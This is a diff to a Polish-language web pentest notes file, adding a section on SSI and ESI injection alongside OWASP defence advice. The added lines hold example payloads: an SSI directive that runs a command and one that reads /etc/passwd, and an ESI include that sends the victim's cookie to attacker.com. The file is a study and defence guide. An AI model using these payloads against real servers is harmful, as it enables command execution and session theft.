@@ -60,12 +60,35 @@ ffuf -u "https://TARGET/page?name=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/ser
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
-> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md
+> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md
 
-- Wylacz SSI (Server Side Includes) jesli nie sa wymagane
-- Waliduj input — nie pozwalaj na znaki specjalne SSI (<!-- # -->)
-- Uzywaj allowlist dozwolonych dyrektyw SSI jesli musza byc wlaczone
-- Ogranicz uprawnienia procesu serwera WWW
+### SSI Injection — czym jest
+
+- Server Side Includes: dyrektywy w HTML procesowane przez serwer przed wyslaniem do klienta
+- Atakujacy wstrzykuje dyrektywy SSI: `<!--#exec cmd="id"-->`, `<!--#include virtual="/etc/passwd"-->`
+- Pliki SSI: `.shtml`, `.shtm`, `.stm` — sprawdz czy serwer je przetwarza
+
+### ESI Injection (Edge Side Includes)
+
+- ESI: dyrektywy procesowane przez reverse proxy/CDN (Varnish, Akamai, Squid)
+- Payload: `<esi:include src="http://attacker.com/steal?cookie=$(HTTP_COOKIE)"/>`
+- Niebezpieczne bo procesowane na warstwie infrastruktury — WAF moze nie wykryc
+
+### Obrona
+
+- **Wylacz SSI** jesli nie sa wymagane — najlepsza obrona
+- **Input validation**: odrzuc znaki `<!--`, `-->`, `#` w danych uzytkownika
+- **Allowlist dyrektyw**: jesli SSI wymagane — jawnie okresl dozwolone dyrektywy
+- **Ogranicz uprawnienia** procesu serwera WWW — minimalne prawa do filesystem
+- **ESI**: wylacz procesowanie ESI na proxy/CDN jesli nie uzywane
+- **Output encoding**: enkoduj dane uzytkownika przed wstawieniem do szablonow SSI
+
+### Input Validation — ogolne zasady
+
+- **Allowlist** (biala lista) zamiast **denylist** (czarna lista) — okresl co jest dozwolone
+- Waliduj: typ danych, dlugosc, zakres, format (regex)
+- Walidacja jest **dodatkowa warstwa** — nie zastepuje output encoding ani parameterized queries
+- Waliduj po stronie SERWERA — client-side validation to UX, nie security
 
 ## ROZSZERZENIA BURP SUITE
 
